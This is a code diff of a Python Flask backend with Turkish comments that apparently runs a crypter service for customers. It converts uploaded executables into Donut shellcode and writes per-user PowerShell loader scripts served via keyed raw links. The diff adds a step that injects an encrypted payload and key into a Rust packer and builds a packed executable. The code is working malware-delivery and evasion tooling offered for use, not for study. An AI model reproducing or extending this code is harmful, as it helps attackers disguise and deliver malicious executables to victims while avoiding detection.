@@ -29,11 +29,11 @@ def get_next_ps_filename(user_id):
     """Sıradaki PS dosya numarasını bul"""
     user_ps_dir = f"stubs/{user_id}/ps"
     os.makedirs(user_ps_dir, exist_ok=True)
-    
+
     existing_files = [f for f in os.listdir(user_ps_dir) if f.startswith("ps") and f.endswith(".ps1")]
     if not existing_files:
         return "ps1.ps1"
-    
+
     numbers = [int(f[2:-4]) for f in existing_files if f[2:-4].isdigit()]
     next_num = max(numbers) + 1 if numbers else 1
     return f"ps{next_num}.ps1"
@@ -41,7 +41,7 @@ def get_next_ps_filename(user_id):
 @app.route("/api/generator", methods=["POST"])
 def generator():
     key = request.args.get("key")
-    
+
     if not key:
         return jsonify({"error": "No key provided"}), 400
 
@@ -68,7 +68,7 @@ def generator():
 
     # Donut ile shellcode oluştur
     shellcode = donut.create(file=save_path)
-    
+
     # Shellcode'u PowerShell formatına çevir
     shellcode_hex = ",".join([f"0x{byte:02x}" for byte in shellcode])
 
@@ -82,7 +82,7 @@ def generator():
     ps_filename = get_next_ps_filename(user_id)
     ps_save_path = f"stubs/{user_id}/ps/{ps_filename}"
     os.makedirs(os.path.dirname(ps_save_path), exist_ok=True)
-    
+
     with open(ps_save_path, "w") as f:
         f.write(ps_script)
 
@@ -108,20 +108,67 @@ def generator():
         except subprocess.CalledProcessError as e:
             return jsonify({"error": "Failed to build the stub", "details": str(e)}), 500
 
-        # Move the compiled exe to the stubs folder
+        # Define the output directory for the compiled stub and packed executable
         user_exe_dir = f"stubs/{user_id}/exe"
         os.makedirs(user_exe_dir, exist_ok=True)
 
         built_exe_path = os.path.join("templates/stub/target/release", "rust_s.exe")
-        new_exe_path = os.path.join(user_exe_dir, f"{user_id}.exe")
 
-        if os.path.exists(built_exe_path):
-            shutil.move(built_exe_path, new_exe_path)
+        # Run obin_generator.py on the compiled stub, outputting to temp_dir
+        try:
+            subprocess.run(["python3", "scripts/obin_generator.py", built_exe_path, temp_dir], check=True)
+        except subprocess.CalledProcessError as e:
+            return jsonify({"error": "Failed to run obin_generator.py", "details": str(e)}), 500
+
+        # Read the generated key and payload from the temporary directory
+        key_rs_path = os.path.join(temp_dir, "key.rs")
+        payload_rs_path = os.path.join(temp_dir, "payload.rs")
+
+        with open(key_rs_path, "r") as f:
+            key_rs = f.read()
+        with open(payload_rs_path, "r") as f:
+            payload_rs = f.read()
+
+        # Inject into the packer
+        packer_main_path = "templates/packer/src/main.rs"
+        with open(packer_main_path, "r") as f:
+            packer_code = f.read()
+
+        original_packer_code = packer_code
+
+        # Replace placeholders with the generated key and payload
+        packer_code = packer_code.replace("//Secret Key Here - replace", key_rs)
+        packer_code = packer_code.replace("//Payload Here - replace", payload_rs)
+
+        if original_packer_code == packer_code:
+            return jsonify({"error": "Failed to inject payload into packer. Placeholders not found."}), 500
+
+        # Copy the packer to a temporary directory for building
+        temp_packer_path = os.path.join(temp_dir, "packer")
+        shutil.copytree("templates/packer", temp_packer_path, ignore=shutil.ignore_patterns('target'))
+
+        # Write the modified packer code to the temporary directory
+        temp_packer_main_path = os.path.join(temp_packer_path, "src", "main.rs")
+        with open(temp_packer_main_path, "w") as f:
+            f.write(packer_code)
+
+        # Build the packer
+        try:
+            subprocess.run(["cargo", "build", "--release"], cwd=temp_packer_path, check=True)
+        except subprocess.CalledProcessError as e:
+            return jsonify({"error": "Failed to build the packer", "details": str(e)}), 500
+
+        # Move the compiled packer to the user's exe directory
+        built_packer_path = os.path.join(temp_packer_path, "target/release/packer.exe")
+        final_exe_path = os.path.join(user_exe_dir, f"{user_id}_packed.exe")
+
+        if os.path.exists(built_packer_path):
+            shutil.move(built_packer_path, final_exe_path)
 
     return jsonify({
         "status": "success",
-        "message": "File processed successfully",
-        "exe_saved_as": filename,
+        "message": "File processed and packer built successfully",
+        "exe_saved_as": f"{user_id}_packed.exe",
         "ps_saved_as": ps_filename,
         "ps_path": ps_save_path,
         "raw_link": raw_link
@@ -131,24 +178,24 @@ def generator():
 def get_ps_script(user_id, ps_filename):
     """Raw key ile PowerShell scriptini görüntüle"""
     raw_key = request.args.get("raw_key")
-    
+
     if not raw_key:
         return jsonify({"error": "No raw_key provided"}), 400
 
     users = load_users()
-    
+
     # Kullanıcıyı raw_key ile bul
     user_found = False
     for user_data in users.values():
         if user_data.get("raw_key") == raw_key and user_data.get("id") == user_id:
             user_found = True
             break
-    
+
     if not user_found:
         return jsonify({"error": "Invalid raw_key or user_id"}), 403
 
     ps_file_path = f"stubs/{user_id}/ps/{ps_filename}"
-    
+
     if not os.path.exists(ps_file_path):
         return jsonify({"error": "PS script not found"}), 404
 
